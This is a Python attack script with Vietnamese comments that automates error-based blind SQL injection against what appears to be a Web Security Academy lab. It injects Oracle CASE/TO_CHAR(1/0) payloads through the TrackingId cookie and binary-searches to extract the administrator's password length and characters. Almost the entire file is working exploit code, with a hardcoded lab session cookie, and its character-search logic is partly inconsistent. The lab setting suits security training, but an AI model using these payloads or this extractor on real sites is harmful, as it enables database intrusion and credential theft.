#!/usr/bin/env python3
# coding: utf-8
"""
Blind SQLi (error-based) extractor:
- tìm LENGTH(password) với binary search
- với mỗi vị trí, tìm ký tự bằng binary search trên charset "0-9a-zA-Z"
Sửa TARGET, TRACKING_ID_PREFIX (nếu cần), SESSION_COOKIE trước khi chạy.
"""

import requests
import time
import urllib.parse

# === CONFIG ===
TARGET = "https://0a5000b203282d62801912f80098003f.web-security-academy.net/"
# Nếu TrackingId có 1 phần cố định trước injection (ví dụ "btLMe7KxEcVPsu6Y"),
# lưu phần đó vào prefix và script sẽ append the injection.
TRACKING_ID_PREFIX = "btLMe7KxEcVPsu6Y"
SESSION_COOKIE = "LmPa8sH3VKIx3NJhwiLjz8FGSQ3f8K5m"
# Nếu server trả 500 khi condition TRUE thì để True; nếu ngược lại thì False.
TRUE_ON_500 = True
# Charset (ordered) để binary search trên chỉ mục
CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
# Giới hạn tối đa độ dài password (tăng nếu cần)
MAX_LEN_GUESS = 80
# Thời gian ngủ giữa request (giảm tốc độ để tránh rate-limit)
SLEEP = 0.1

# === helper functions ===

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": TARGET + "login"
})

def send_injected_tracking(tracking_value):
    """
    Gửi request với cookie TrackingId chứa tracking_value (already encoded).
    Trả về response.status_code
    """
    cookie_header = f"TrackingId={tracking_value}; session={SESSION_COOKIE}"
    headers = {"Cookie": cookie_header}
    resp = session.get(TARGET, headers=headers, allow_redirects=False, timeout=15)
    return resp.status_code, resp

def build_encoded_tracking(injection_payload):
    """
    Build final TrackingId value from prefix + injection and url-encode it.
    We URL-encode whole value to be safe in cookie.
    """
    raw = TRACKING_ID_PREFIX + injection_payload
    # Percent-encode but keep safe characters typically allowed in cookies - use quote
    return urllib.parse.quote(raw, safe='')

def condition_result_is_true(status_code):
    """
    Dựa vào status_code và TRUE_ON_500 để quyết định condition SQL là True hay False.
    """
    if TRUE_ON_500:
        return status_code == 500
    else:
        return status_code == 200

# === 1) tìm LENGTH bằng binary search ===
def find_password_length(max_guess=MAX_LEN_GUESS):
    lo = 1
    hi = max_guess
    found = None
    while lo <= hi:
        mid = (lo + hi) // 2
        # SQL: check if LENGTH(password) >= mid
        inj = f"' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator') >= {mid}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"
        tracking = build_encoded_tracking(inj)
        status, _ = send_injected_tracking(tracking)
        is_true = condition_result_is_true(status)
        # if true => length >= mid
        if is_true:
            found = mid
            lo = mid + 1
        else:
            hi = mid - 1
        time.sleep(SLEEP)
    if found is None:
        raise RuntimeError("Không thể tìm length (tăng MAX_LEN_GUESS?)")
    # found holds the largest mid where length >= mid, so final length = found
    return found

# === 2) tìm ký tự tại vị trí pos (1-based) bằng binary search trên CHARSET index ===
def get_char_at_pos(pos):
    lo = 0
    hi = len(CHARSET) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        mid_char = CHARSET[mid]
        mid_ord = ord(mid_char)
        # Use ASCII comparison: ASCII(SUBSTR(...,pos,1)) <= mid_ord
        inj = (
            f"' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)) <= {mid_ord}) "
            f"THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"
        )
        tracking = build_encoded_tracking(inj)
        status, _ = send_injected_tracking(tracking)
        is_true = condition_result_is_true(status)
        if is_true:
            # actual char ASCII <= mid_ord -> move hi to mid-1 but keep mid as candidate
            hi = mid - 1
            candidate = mid_char
            # after loop if candidate holds lowest bound? We'll refine by continuing loop.
            # To correctly get exact character, when loop ends we need to test equality.
            # But here continue; we'll check equality at the end.
        else:
            lo = mid + 1
        time.sleep(SLEEP)
    # After binary search, lo points to smallest index > actual index.
    # So actual index = lo if CHARSET[lo] equals actual char. We verify:
    if lo < len(CHARSET):
        # verify equality with '=' test
        test_char = CHARSET[lo]
        inj_eq = (
            f"' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1) = '{test_char}') "
            f"THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"
        )
        tracking_eq = build_encoded_tracking(inj_eq)
        status_eq, _ = send_injected_tracking(tracking_eq)
        if condition_result_is_true(status_eq):
            return test_char
    # fallback: lo-1
    if lo-1 >= 0 and lo-1 < len(CHARSET):
        return CHARSET[lo-1]
    # if not found in CHARSET (possible if password contains other chars)
    return None

# === Main flow ===
def main():
    print("[*] Bắt đầu tìm độ dài mật khẩu...")
    length = find_password_length()
    print(f"[*] Độ dài mật khẩu (ước tính): {length}")
    pw = []
    for pos in range(1, length + 1):
        print(f"[*] Tìm ký tự vị trí {pos} ... ", end="", flush=True)
        ch = get_char_at_pos(pos)
        if ch is None:
            print("KHÔNG TÌM THẤY (ký tự không nằm trong CHARSET).")
            pw.append("?")
        else:
            print(ch)
            pw.append(ch)
    password = "".join(pw)
    print("[*] Hoàn tất. Password:", password)
    return password

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("Lỗi:", e)
